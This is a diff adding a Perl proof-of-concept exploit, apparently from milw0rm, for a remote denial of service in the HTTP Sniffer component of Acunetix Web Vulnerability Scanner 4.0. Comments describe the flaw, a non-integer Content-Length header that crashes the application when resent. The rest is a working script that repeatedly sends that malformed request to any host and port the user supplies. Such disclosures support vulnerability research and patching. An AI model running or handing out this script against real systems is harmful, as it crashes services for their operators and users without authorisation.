@@ -1,0 +1,82 @@
+#!/usr/bin/perl -w
+#
+# Acunetix Web Vulnerability Scanner 4.0 <= Build 20060717
+# HTTP Sniffer component
+# Remote Denial of Service
+#
+# Explaination:
+# I found a DoS in Acunetix WVS doing a little bit of fuzzing.
+# The flaw is triggered when a malformed packet is sent. Thus, an Exception Handler shows
+# an Error Window saying: "'die!!!' is not a valid integer value", but, if we sent the
+# same packet again (while that message still visible) the application will crash.
+#
+# The malformed HTTP packet contains an invalid 'Content-Length' field (string), and it
+# must be a positive integer.
+#
+# Acunetix' support: "The bug which was causing it to crash was also related to another
+# bug fix which was implemented in later versions.". So, in latest version, an Error
+# message like this appears:
+#  ________________________________________________________
+# |wvs.exe                                                 |
+# |--------------------------------------------------------|
+# |[X] An error ocurred in the application                 |
+# |                                  |continue application||
+# |                                  |restart application ||
+# ||send bug report||show bug report||close applicacion   ||
+# |________________________________________________________|
+#
+# Affected version tested:
+# Acunetix WVS (Consultant Edition) 4.0 Build 20060717
+#
+# Non-affected version tested:
+# Acunetix WVS 4.0 Build 20060717
+#
+# nitr0us <nitrousenador[ at ]gmail[ dot]com>
+# 01/01/07 . . . Happy new year.
+
+use strict;
+use Socket qw( :DEFAULT :crlf );        # $CRLF
+use IO::Socket;
+
+sub header
+{
+       print "################################################################\n";
+       print "#   Acunetix Web Vulnerability Scanner 4.0 <= Build 20060717   #\n";
+       print "#                  HTTP Sniffer component                      #\n";
+       print "#                 Remote Denial of Service                     #\n";
+       print "#                        by nitr0us                            #\n";
+       print "################################################################\n\n";
+       print "Usage: $0 <host> [port(default 8080)]\n";
+       exit(0xdead);
+}
+
+header() unless $ARGV[0];
+
+my $port = 8080;
+my $acunetix_wvs;
+my $packetz = 5;
+
+if($ARGV[1]){
+       $port = $ARGV[1];
+}
+
+print "\n[+] Connecting and sending $packetz malformed packetz\n\n";
+
+for(my $foo = 0; $foo < $packetz; $foo++){
+       $acunetix_wvs = IO::Socket::INET->new(  PeerAddr        =>      $ARGV[0],
+                                               PeerPort        =>      $port,
+                                               Proto           =>      'tcp')
+               or die "Could not create socket: $!\n";
+
+       print $acunetix_wvs "GET / HTTP/1.0$CRLF";
+       print $acunetix_wvs "Content-Length: die!!!$CRLF$CRLF"; # Trigger
+
+       $acunetix_wvs->close();
+
+       sleep(1);
+}
+
+print "[+] $packetz malformed packetz sent ];D\n\n";
+print "[+] Acunetix WVS! killed ! ;)\n\n";
+
+# milw0rm.com [2007-01-04]
